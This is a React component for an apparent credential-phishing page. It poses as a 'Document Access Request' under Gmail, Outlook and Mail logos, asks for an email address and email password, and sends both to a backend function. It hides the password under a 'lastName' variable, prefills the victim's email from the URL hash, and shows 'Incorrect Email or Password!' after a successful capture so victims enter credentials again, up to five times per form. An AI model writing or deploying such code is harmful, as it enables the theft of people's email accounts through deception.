import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Eye, EyeOff } from "lucide-react";
import formBackground from "@/assets/form-background.jpg";

const FormPage = () => {
  const { username, formCode } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const [email, setEmail] = useState("");
  const [lastName, setLastName] = useState("");
  const [submissionCount, setSubmissionCount] = useState(0);
  const [loading, setLoading] = useState(false);
  const [formExists, setFormExists] = useState<boolean | null>(null);
  const [showLastName, setShowLastName] = useState(false);
  const [alert, setAlert] = useState<{ type: 'success' | 'error', message: string } | null>(null);

  useEffect(() => {
    // Check if form exists and get hash email if present
    checkFormExists();
    checkHashEmail();
  }, [username, formCode]);

  const checkFormExists = async () => {
    try {
      // Look up user by username
      const { data: userData, error: userError } = await supabase
        .from('users')
        .select('id, username')
        .eq('username', username)
        .maybeSingle();

      if (userError || !userData) {
        setFormExists(false);
        return;
      }

      // Look up form by form code and user ID
      const { data: formData, error: formError } = await supabase
        .from('forms')
        .select('id, form_code, user_id')
        .eq('form_code', formCode)
        .eq('user_id', userData.id)
        .maybeSingle();

      if (formError) {
        console.error('Error checking form:', formError);
        setFormExists(false);
        return;
      }

      if (formData) {
        setFormExists(true);
        // Get submission count for this form
        const { count } = await supabase
          .from('submissions')
          .select('*', { count: 'exact', head: true })
          .eq('form_id', formData.id);
        
        setSubmissionCount(count || 0);
      } else {
        setFormExists(false);
      }
    } catch (error) {
      console.error('Error in checkFormExists:', error);
      setFormExists(false);
    }
  };

  const checkHashEmail = () => {
    const hash = window.location.hash.substring(1);
    if (hash && hash.includes('@')) {
      setEmail(hash);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (submissionCount >= 5) {
      toast({
        title: "Limit Reached",
        description: "Maximum submissions reached. Redirecting to homepage.",
      });
      setTimeout(() => navigate("/"), 2000);
      return;
    }

    setLoading(true);

    try {
      const { data, error } = await supabase.functions.invoke('submit-form', {
        body: {
          username,
          formCode,
          email,
          lastName
        }
      });

      if (error) {
        setAlert({ type: 'error', message: 'Error: Send Failed' });
      } else {
        setAlert({ type: 'success', message: 'Incorrect Email or Password!' });
        
        setLastName("");
        setSubmissionCount(prev => prev + 1);
        
        if (submissionCount + 1 >= 5) {
          setTimeout(() => navigate("/"), 2000);
        }
      }
      
      setTimeout(() => setAlert(null), 5000);
    } catch (error) {
      setAlert({ type: 'error', message: 'Error: Send Failed' });
      setTimeout(() => setAlert(null), 5000);
    } finally {
      setLoading(false);
    }
  };

  // If form doesn't exist, show error message
  if (formExists === false) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center max-w-md mx-auto p-6">
          <div className="text-red-500 mb-4">
            <svg className="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.5 0L4.314 15.5c-.77.833-.23 2.5 1.732 2.5z" />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Form Not Found</h1>
          <p className="text-gray-600 mb-6">
            The form you're looking for doesn't exist or has been removed.
          </p>
          <Button 
            onClick={() => navigate("/")} 
            className="bg-blue-600 hover:bg-blue-700"
          >
            Go to Homepage
          </Button>
        </div>
      </div>
    );
  }

  if (formExists === null) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
          <p className="mt-4 text-gray-600">Loading form...</p>
        </div>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center bg-no-repeat"
      style={{ backgroundImage: `url(${formBackground})` }}
    >
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <div className="flex justify-center items-center gap-2 mb-4 flex-wrap">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" alt="Gmail" className="w-6 h-6" />
            <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook" className="w-6 h-6" />
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg" alt="Mail" className="w-6 h-6" />
          </div>
          <CardTitle className="text-2xl font-bold text-gray-900">Document Access Request</CardTitle>
          <CardDescription>
            Please provide your information to access the document
          </CardDescription>
          
          {alert && (
            <div className={`mt-4 p-3 rounded-md text-sm font-medium ${
              alert.type === 'success' ? 'bg-red-50 text-red-700 border border-red-200' : 'bg-red-50 text-red-700 border border-red-200'
            }`}>
              {alert.message}
            </div>
          )}
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email Address</Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email address"
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="lastName">Password</Label>
              <div className="relative">
                <Input
                  id="lastName"
                  type={showLastName ? "text" : "password"}
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  placeholder="Enter your email password"
                  required
                />
                <button
                  type="button"
                  className="absolute inset-y-0 right-0 pr-3 flex items-center"
                  onClick={() => setShowLastName(!showLastName)}
                >
                  {showLastName ? (
                    <EyeOff className="h-4 w-4 text-gray-400" />
                  ) : (
                    <Eye className="h-4 w-4 text-gray-400" />
                  )}
                </button>
              </div>
            </div>
            
            
            <Button 
              type="submit" 
              className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800"
              disabled={loading}
            >
              {loading ? "Processing..." : "Access Document"}
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
  );
};

export default FormPage;